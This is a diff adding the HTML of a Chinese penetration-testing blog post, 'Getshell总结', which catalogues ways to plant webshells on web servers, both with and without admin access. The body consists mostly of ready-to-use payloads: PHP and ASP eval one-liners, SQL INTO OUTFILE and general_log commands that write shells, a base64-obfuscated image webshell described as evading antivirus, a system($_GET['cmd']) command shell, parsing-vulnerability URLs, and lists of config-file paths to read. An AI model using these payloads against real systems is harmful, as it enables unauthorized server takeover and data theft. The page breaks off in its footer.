@@ -1,0 +1,827 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.1">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.png?v=7.4.1">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16.png?v=7.4.1">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.1" color="#222">
+  <link rel="alternate" href="/atom.xml" title="C0cho's blog" type="application/atom+xml">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.1">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.4.1',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="Getshell分为进管理员后台Getshell和不进后台Getshell，本文主要总结常见进后台Getshell和部分。进后台Getshell管理员后台直接Getshell管理员后台直接上传Getshell，有时候带密码的Webshell连接时容易被waf拦截，可以上传不加密的Webshell如有权限限制可以尝试管理后台自带的修改文件名功能在文件名前加../来穿越目录，如上传的文件为a.php，">
+<meta name="keywords" content="Getshell">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Getshell总结">
+<meta property="og:url" content="https://choge.top/2020/02/23/Getshell总结/index.html">
+<meta property="og:site_name" content="C0cho&#39;s blog">
+<meta property="og:description" content="Getshell分为进管理员后台Getshell和不进后台Getshell，本文主要总结常见进后台Getshell和部分。进后台Getshell管理员后台直接Getshell管理员后台直接上传Getshell，有时候带密码的Webshell连接时容易被waf拦截，可以上传不加密的Webshell如有权限限制可以尝试管理后台自带的修改文件名功能在文件名前加../来穿越目录，如上传的文件为a.php，">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://choge.top/2020/02/23/Getshell总结/gt-1.png">
+<meta property="og:image" content="https://choge.top/2020/02/23/Getshell总结/gt-2.png">
+<meta property="og:image" content="https://choge.top/2020/02/23/Getshell总结/gt-3.png">
+<meta property="og:image" content="https://choge.top/2020/02/23/Getshell总结/gt-4.png">
+<meta property="og:image" content="https://choge.top/2020/02/23/Getshell总结/gt-5.png">
+<meta property="og:image" content="https://choge.top/2020/02/23/Getshell总结/gt-6.png">
+<meta property="og:updated_time" content="2020-02-23T12:15:34.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Getshell总结">
+<meta name="twitter:description" content="Getshell分为进管理员后台Getshell和不进后台Getshell，本文主要总结常见进后台Getshell和部分。进后台Getshell管理员后台直接Getshell管理员后台直接上传Getshell，有时候带密码的Webshell连接时容易被waf拦截，可以上传不加密的Webshell如有权限限制可以尝试管理后台自带的修改文件名功能在文件名前加../来穿越目录，如上传的文件为a.php，">
+<meta name="twitter:image" content="https://choge.top/2020/02/23/Getshell总结/gt-1.png">
+  <link rel="canonical" href="https://choge.top/2020/02/23/Getshell总结/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>Getshell总结 | C0cho's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">C0cho's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">less is more</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+        
+        
+        <li class="menu-item menu-item-home">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-about">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-tags">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+          
+        
+      
+    
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签<span class="badge">44</span></a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-categories">
+      
+    
+      
+      
+        
+      
+        
+          
+        
+      
+        
+      
+    
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类<span class="badge">8</span></a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+      
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档<span class="badge">76</span></a>
+
+  </li>
+      
+    
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger">
+          <i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="搜索..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://choge.top/2020/02/23/Getshell总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="C0cho">
+      <meta itemprop="description" content="记录生活的点点滴滴">
+      <meta itemprop="image" content="/images/author.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="C0cho's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            Getshell总结
+            
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              
+                
+              
+
+              <time title="创建时间：2020-02-23 09:12:27 / 修改时间：20:15:34" itemprop="dateCreated datePublished" datetime="2020-02-23T09:12:27+08:00">2020-02-23</time>
+            </span>
+          
+            
+
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-test/" itemprop="url" rel="index">
+                    <span itemprop="name">Penetration test</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+          
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span>6k</span>
+            </span>
+          
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span>5 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>Getshell分为进管理员后台Getshell和不进后台Getshell，本文主要总结常见进后台Getshell和部分。</p><h2 id="进后台Getshell"><a href="#进后台Getshell" class="headerlink" title="进后台Getshell"></a>进后台Getshell</h2><h3 id="管理员后台直接Getshell"><a href="#管理员后台直接Getshell" class="headerlink" title="管理员后台直接Getshell"></a>管理员后台直接Getshell</h3><p>管理员后台直接上传Getshell，有时候带密码的Webshell连接时容易被waf拦截，可以上传不加密的Webshell如有权限限制可以尝试管理后台自带的修改文件名功能在文件名前加../来穿越目录，如上传的文件为a.php，将a.php修改为../a.php。</p><a id="more"></a>
+
+<h3 id="后台数据库备份Getshell"><a href="#后台数据库备份Getshell" class="headerlink" title="后台数据库备份Getshell"></a>后台数据库备份Getshell</h3><p>后台数据库备份getshell，上传图片马并获取图片马路径，通过数据库备份修改后缀名，如有后缀名无法修改或路径无法修改限制可修改前端代码绕过，当所备份的数据库来源无法修改时，我们可以通过首先将一句话木马写入数据库，比如通过新建管理员用户，将用户名用一句话木马代替（用户名通常有长度限制，在前端修改maxlength即可），<code>&lt;%eval request (&quot;pass&quot;)%&gt;</code> 然后再通过备份数据库后访问此界面Getshell。</p>
+<h3 id="各类上传Getshell"><a href="#各类上传Getshell" class="headerlink" title="各类上传Getshell"></a>各类上传Getshell</h3><p>参考本博上传绕过篇</p>
+<h3 id="修改网站上传类型Getshell"><a href="#修改网站上传类型Getshell" class="headerlink" title="修改网站上传类型Getshell"></a>修改网站上传类型Getshell</h3><p>修改网站上传类型，后台设置中添加aasps|asp|php|jsp|aspx|asa|cer，保存后上传aasps文件，上传后为asp文件可以解析Getshll</p>
+<h3 id="上传其他脚本类型Getshell"><a href="#上传其他脚本类型Getshell" class="headerlink" title="上传其他脚本类型Getshell"></a>上传其他脚本类型Getshell</h3><p>一台服务器有多个站，如a网站为asp脚本，b网站为php脚本，而a中限制了上传文件类型为asp的文件，此时可以上传php的脚本，来拿shell；也可以尝试脚本文件后缀名改为asa或者在后面直接加个.如xx.asp.来突破文件类型限制进行上传来Getshell</p>
+<h3 id="解析漏洞Getshell"><a href="#解析漏洞Getshell" class="headerlink" title="解析漏洞Getshell"></a>解析漏洞Getshell</h3><h4 id="IIS6-0解析漏洞"><a href="#IIS6-0解析漏洞" class="headerlink" title="IIS6.0解析漏洞"></a>IIS6.0解析漏洞</h4><p><code>http://www.xxx.com/xx.asp/xx.jpg</code>，<code>http://www.xxx.com/xx.asp/xx.txt</code>，<code>http://www.xxx.com/xx.asp/xx.asp;jpg</code></p>
+<h4 id="IIS7-0-7-5、Nginx-lt-8-0解析漏洞"><a href="#IIS7-0-7-5、Nginx-lt-8-0解析漏洞" class="headerlink" title="IIS7.0/7.5、Nginx&lt;8.0解析漏洞"></a>IIS7.0/7.5、Nginx&lt;8.0解析漏洞</h4><p><code>http://www.xxx.com/xx.jpg/.php</code></p>
+<h4 id="Nginx-lt-8-03空字节代码执行漏洞"><a href="#Nginx-lt-8-03空字节代码执行漏洞" class="headerlink" title="Nginx&lt;8.03空字节代码执行漏洞"></a>Nginx&lt;8.03空字节代码执行漏洞</h4><p>版本范围：Nginx0.5.,0.6., 0.7 &lt;= 0.7.65, 0.8 &lt;= 0.8.37</p>
+<p><code>http://www.xxx.com/xx.jpg%00.php</code></p>
+<h4 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h4><p><code>http://www.xxx.com/xx.php.owf.rar</code>逆向解析，直到能解析出php为止</p>
+<h4 id="CVE-2013-4547-Nginx解析漏洞"><a href="#CVE-2013-4547-Nginx解析漏洞" class="headerlink" title="CVE-2013-4547 Nginx解析漏洞"></a>CVE-2013-4547 Nginx解析漏洞</h4><p><code>http://www.xxx.com/xx.jpg（非编码空格）\0.php</code></p>
+<h3 id="编辑器漏洞Getshell"><a href="#编辑器漏洞Getshell" class="headerlink" title="编辑器漏洞Getshell"></a>编辑器漏洞Getshell</h3><p>传送门：</p>
+<p><a href="https://navisec.it/编辑器漏洞手册/" target="_blank" rel="noopener">https://navisec.it/%e7%bc%96%e8%be%91%e5%99%a8%e6%bc%8f%e6%b4%9e%e6%89%8b%e5%86%8c/</a></p>
+<h3 id="网站配置插马Getshell"><a href="#网站配置插马Getshell" class="headerlink" title="网站配置插马Getshell"></a>网站配置插马Getshell</h3><p>进入后台后，网站配置插马getshell，可以找到源码本地搭建，插入时注意与源码闭合，如果插入出错可能导致网站报废。如asp中单引号表示单行注释作用<code>&quot;%&gt;&lt;%eval request(&quot;v01cano&quot;)%&gt;&lt;%&#39;</code></p>
+<h3 id="编辑器模版Getshell"><a href="#编辑器模版Getshell" class="headerlink" title="编辑器模版Getshell"></a>编辑器模版Getshell</h3><p>通过网站的模版编写一句话，然后生成脚本文件getshell  通过将木马添加到压缩文件，把名字改为网站的模版类型，上传到服务器，getshell）（新建或修改目录名为xx.asp/  此目录下的jsp，html会以asp执行，配置iis6.有0解析漏洞</p>
+<h3 id="修改脚本文件Getshell"><a href="#修改脚本文件Getshell" class="headerlink" title="修改脚本文件Getshell"></a>修改脚本文件Getshell</h3><p>修改后台脚本文件插入一句话直接Getshell，尽量插在头和尾。</p>
+<p>###上传插件、更新页面Getshell</p>
+<p>wordpress，dz等，如编辑wordpress404页面插入一句话，可以先下载对应版本找到404路径，部分OA上传插件Getshell， jboss，tomcat上传war包getshell等</p>
+<h3 id="执行sql语句写入Webshell"><a href="#执行sql语句写入Webshell" class="headerlink" title="执行sql语句写入Webshell"></a>执行sql语句写入Webshell</h3><p>首先执行错误的sql语句，使其暴露出网站的根目录，以ecshop为例，进入后台执行sql查询<code>select &quot;&lt;?php phpinfo();?&gt;&quot; into outfile &quot;C:\\vulcms\\ecshopv3.6\\ecshop\\v01cano.php&quot;;</code>关于此语句说明，在windows中有时候需要使用斜杠/有时候需要使用双反斜杠\末尾有时候需要分号，有时候也不需要分号。也可以先将一句话通过ecshop的新建管理员写入到user表中，然后通过数据库备份配合解析漏洞Getshell。</p>
+<h3 id="命令执行Getshell"><a href="#命令执行Getshell" class="headerlink" title="命令执行Getshell"></a>命令执行Getshell</h3><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><p><code>echo ^&lt;^?php @eval($_POST[C0cho]);?^&gt;^ &gt;c:\1.php</code></p>
+<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><p><code>echo -e &quot;&lt;?php @assert(\$_POST[C0cho])?&gt;&quot; &gt; 1.php</code></p>
+<p>Linux需要在$前加\进行防转义，Windows需要在&lt;前加^防转义，Windows和Linux中的 “可以使用’或不使用进行尝试</p>
+<h3 id="文件包含Getshell"><a href="#文件包含Getshell" class="headerlink" title="文件包含Getshell"></a>文件包含Getshell</h3><p>文件包含有时可绕过waf</p>
+<h4 id="asp包含"><a href="#asp包含" class="headerlink" title="asp包含"></a>asp包含</h4><p><code>include file=&quot;123.jpg&quot;</code>调用的文件必须和被调用的文件在同一目录，否则找不到，如果不在同一目录，用下面语句也使用如下代码<code>include virtual=&quot;文件所在目录/123.jpg&quot;</code></p>
+<h4 id="php包含"><a href="#php包含" class="headerlink" title="php包含"></a>php包含</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'123.jpg'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="使用php-input"><a href="#使用php-input" class="headerlink" title="使用php://input"></a>使用php://input</h4><p>使用burpsuite截取数据包，并修改内容转发(还可以使用hackbar工具中的post data中输入<code>&lt;?php fputs(fopen(&quot;shell1.php&quot;,&quot;w&quot;),&#39;1111&lt;?php @assert($_POST[xss])?&gt;2222&#39;)?&gt;</code>等一句话木马)</p>
+<p>截取get请求</p>
+<p><img src="//choge.top/2020/02/23/Getshell总结/gt-1.png" alt="gt-1"></p>
+<p>将一句话木马</p>
+<p><img src="//choge.top/2020/02/23/Getshell总结/gt-2.png" alt="gt-2"></p>
+<p>浏览器访问查看是否成功</p>
+<p><img src="//choge.top/2020/02/23/Getshell总结/gt-3.png" alt="gt-3"></p>
+<h3 id="数据库命令执行Getshell"><a href="#数据库命令执行Getshell" class="headerlink" title="数据库命令执行Getshell"></a>数据库命令执行Getshell</h3><h4 id="Access导出"><a href="#Access导出" class="headerlink" title="Access导出"></a>Access导出</h4><p>Access可导出xxx等文件需要配合解析漏洞</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create table cmd (a varchar(50));</span><br><span class="line">insert into cmd (a) values (&apos;一句话木马&apos;)   #一句话木马如：&lt;%execute request(1)%&gt;</span><br><span class="line">select * into [a] in &apos;e:\web\webshellcc\1.asa;x.xls&apos; &apos;excel 4.0;&apos; from cmd </span><br><span class="line">drop table cmd</span><br></pre></td></tr></table></figure>
+
+<p>菜刀直连<code>https://www.webshell.cc/1.asa;x.xls</code></p>
+<h4 id="Sqlserver导出"><a href="#Sqlserver导出" class="headerlink" title="Sqlserver导出"></a>Sqlserver导出</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec sp_makewebtask &apos;C:\test1.php&apos;,&apos;select &quot;&lt;%eval request(&quot;pass&quot;)%&gt;&quot; &apos;--</span><br></pre></td></tr></table></figure>
+
+<h4 id="Mysql导出"><a href="#Mysql导出" class="headerlink" title="Mysql导出"></a>Mysql导出</h4><p>以phpMyAdmin为例</p>
+<h5 id="方式一"><a href="#方式一" class="headerlink" title="方式一"></a>方式一</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create TABLE xiaoma (xiaoma1 text NOT NULL);</span><br><span class="line">insert INTO xiaoma (xiaoma1) VALUES(&apos;&lt;?php eval($_POST[xiaoma]);?&gt;&apos;);</span><br><span class="line">select xiaoma1 from xiaoma into outfile &apos;D:/phpstudy/www/7.php&apos;;</span><br><span class="line">drop TABLE IF EXISTS xiaoma;</span><br></pre></td></tr></table></figure>
+
+<h5 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a>方式二</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php eval($_POST[v01cano]);?&gt;&quot; into outfile &apos;D:/phpstudy/www/a.php&apos;</span><br></pre></td></tr></table></figure>
+
+<h5 id="方式三"><a href="#方式三" class="headerlink" title="方式三"></a>方式三</h5><p>当数据库路径未知时Getshell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//创建表a,并且将httpd.conf写入到表a中</span><br><span class="line">create table a(a text);load data infile &quot;C:/phpStudy/Apache/conf/httpd.conf&quot; into table a;</span><br></pre></td></tr></table></figure>
+
+<p>然后执行导出操作，将该文件下载，使用notepad++打开，最后搜索documentroot，即可找到网站的根目录：</p>
+<p><img src="//choge.top/2020/02/23/Getshell总结/gt-4.png" alt="gt-4"></p>
+<p>文件可能存在的一些路径：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># Windows</span><br><span class="line">c:\windows\php.ini                             # php配置文件</span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml       # IIS虚拟主机配置文件</span><br><span class="line"> # Linux</span><br><span class="line">/etc/php.ini                                   # php配置文件</span><br><span class="line">/etc/httpd/conf.d/php.conf</span><br><span class="line">/etc/httpd/conf/httpd.conf                     # Apache配置文件</span><br><span class="line">/usr/local/apache/conf/httpd.conf</span><br><span class="line">/usr/local/apache2/conf/httpd.conf</span><br><span class="line">/usr/local/mysql</span><br><span class="line">/user/local/httpd/conf/httpd.conf</span><br><span class="line">/usr/local/apache/conf/extra/httpd-vhosts.conf # 虚拟目录配置文件</span><br><span class="line">/user/local/nginx/conf/httpd.conf              # Nginx配置文件</span><br></pre></td></tr></table></figure>
+
+<h5 id="方式四通过load-file函数直接加载该文件内容"><a href="#方式四通过load-file函数直接加载该文件内容" class="headerlink" title="方式四通过load_file函数直接加载该文件内容"></a>方式四通过load_file函数直接加载该文件内容</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&apos;C:/phpStudy/Apache/conf/httpd.conf&apos;);</span><br></pre></td></tr></table></figure>
+
+<p>同时需要做如下配置</p>
+<p><img src="//choge.top/2020/02/23/Getshell总结/gt-5.png" alt="gt-5"></p>
+<p><img src="//choge.top/2020/02/23/Getshell总结/gt-6.png" alt="gt-6"></p>
+<h5 id="方式五"><a href="#方式五" class="headerlink" title="方式五"></a>方式五</h5><p>general_log_file方法获取Webshell</p>
+<p><code>show global variables like &#39;secure%&#39;</code>显示secure_file_priv的值为NULL，不能利用写into outfile写木马getshell。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &quot;%genera%&quot;;  #查看genera文件配置情况</span><br><span class="line">set global general_log = off;   #关闭general_log  </span><br><span class="line">set global general_log = &apos;on&apos;;  #如果general_log关闭需要开启</span><br><span class="line">set global general_log_file = &apos;D:/www/web/shell.php&apos;</span><br></pre></td></tr></table></figure>
+
+<h5 id="方式六"><a href="#方式六" class="headerlink" title="方式六"></a>方式六</h5><p>可执行命令方式</p>
+<p><code>select &#39;&lt;?php echo \&#39;&lt;pre&gt;\&#39;; system($_GET[\&#39;cmd\&#39;]); echo \&#39;&lt;/pre&gt;\&#39;; ?&gt;&#39; INTO OUTFILE &#39;d:/www/shell.php&#39;</code></p>
+<p>使用方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.xxx.com/shell.php?cmd=ipconfig  #cmd=后面加命令</span><br></pre></td></tr></table></figure>
+
+<h5 id="方式七"><a href="#方式七" class="headerlink" title="方式七"></a>方式七</h5><p>过杀毒软件方式</p>
+<p>上传图片马c.jpg，图片马内容如下：</p>
+<p><code>&lt;?php$a = &#39;PD9waHAgQGV2YWwoJF9QT1NUWydjJ10pO2RtdSgpOz8+&#39;; error_reporting(0); @set_time_limit(0); eval(&quot;?&gt;&quot;.base64_decode($a));?&gt;</code></p>
+<p>导出Webshell</p>
+<p><code>select &#39;&lt;?php include &#39;c.jpg&#39;?&gt;&#39; INTO OUTFILE &#39;D:/work/www/shell.php&#39;</code></p>
+<h5 id="方式八"><a href="#方式八" class="headerlink" title="方式八"></a>方式八</h5><p>直接导出加密Webshell</p>
+<p><code>select unhex(&#39;加密代码&#39;) into dumpfile &#39;D:/www/web/shell.php&#39;</code></p>
+<h2 id="不进后台Getshell"><a href="#不进后台Getshell" class="headerlink" title="不进后台Getshell"></a>不进后台Getshell</h2><h3 id="0day-Getshell"><a href="#0day-Getshell" class="headerlink" title="0day Getshell"></a>0day Getshell</h3><p>各类OA，coremail，cms，php框架，数据库，java框架等0day，1day，nday Getshell</p>
+<h3 id="写入日志Getshell"><a href="#写入日志Getshell" class="headerlink" title="写入日志Getshell"></a>写入日志Getshell</h3><p>获取日志路径，在访问过程中在url或者其他位置写入<code>&lt;?php eval($_POST[c]);?&gt;</code>等信息，使其日志记录此代码，然后访问日志路径，菜刀连接Getshell，如phpinfo();中能查看到error.log和access.log的路径。</p>
+<h3 id="IIS-Tomcat写权限Getshell"><a href="#IIS-Tomcat写权限Getshell" class="headerlink" title="IIS/Tomcat写权限Getshell"></a>IIS/Tomcat写权限Getshell</h3><p>IIS6.0，put协议上传手工或工具，批量扫描工具：iis put scaner，写权限利用：桂林老兵</p>
+<p>Tomcat put上传 CVE-2017-12615 工具传送门：<a href="https://link.zhihu.com/?target=https%3A//github.com/iBearcat/CVE-2017-12615" target="_blank" rel="noopener">https://link.zhihu.com/?target=https%3A//github.com/iBearcat/CVE-2017-12615</a></p>
+<h3 id="上传漏洞Getshell"><a href="#上传漏洞Getshell" class="headerlink" title="上传漏洞Getshell"></a>上传漏洞Getshell</h3><p>参考本博上传绕过</p>
+<h3 id="上传会员头像Getshell"><a href="#上传会员头像Getshell" class="headerlink" title="上传会员头像Getshell"></a>上传会员头像Getshell</h3><p>将Webshell放入文件夹，然后压缩成zip文件。上传正常头像抓包将图片文件内容删除，burp右键选择文件黏贴功能，将zip包内容复制到burp中的图片内容，放行后菜刀连接图片上传路径下的文件夹（zip压缩包名）下的Webshell</p>
+<h3 id="注入漏洞Getshell"><a href="#注入漏洞Getshell" class="headerlink" title="注入漏洞Getshell"></a>注入漏洞Getshell</h3><p>参考本博sql注入</p>
+<h3 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a>远程命令执行</h3><p>参考本博Linux/Windows反弹shell，脚本语言、powershell反弹shell，Kali/Cobalt Strike等各种上线方法</p>
+<h3 id="其他漏洞Getshell"><a href="#其他漏洞Getshell" class="headerlink" title="其他漏洞Getshell"></a>其他漏洞Getshell</h3><p>XXE，SSRF，反序列化，strust2等一种或多种组合利用Getshell</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.jianshu.com/p/a1fa305a6b8f" target="_blank" rel="noopener">https://www.jianshu.com/p/a1fa305a6b8f</a></p>
+<p><a href="https://mp.weixin.qq.com/s/zl_CEDVpj20BUneHNuq8lg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/zl_CEDVpj20BUneHNuq8lg</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+      
+    </div>
+        
+      
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>C0cho
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://choge.top/2020/02/23/Getshell总结/" title="Getshell总结">https://choge.top/2020/02/23/Getshell总结/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+      
+
+      <footer class="post-footer">
+          
+            
+          
+          <div class="post-tags">
+            
+              <a href="/tags/Getshell/" rel="tag"># Getshell</a>
+            
+          </div>
+        
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
